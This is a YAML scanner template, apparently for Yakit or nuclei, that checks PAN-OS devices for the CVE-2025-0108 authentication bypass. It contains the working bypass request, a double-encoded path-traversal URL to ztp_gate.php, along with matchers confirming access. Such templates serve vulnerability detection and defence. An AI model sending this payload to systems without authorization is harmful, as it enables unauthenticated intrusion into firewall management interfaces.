script_name: Palo Alto Networks PAN-OS 身份验证绕过漏洞
content:
id: CVE-2025-0108

info:
  name: Palo Alto Networks PAN-OS 身份验证绕过漏洞
  author: Deans
  severity: high
  description: 该漏洞是由于PAN-OS中Nginx/Apache对路径的处理不同导致的。未经授权的攻击者可以利用这一漏洞绕过系统身份验证直接访问Web界面从而造成敏感数据泄露或系统被接管等更大的危害。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 5dba1173bf734f7d858ca9af6cf05bcc

http:
- raw:
  - |+
    @timeout: 30s
    GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
    Content-Type: application/json
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
    condition: and

  - type: word
    part: body
    words:
    - Zero Touch Provisioning
    condition: and
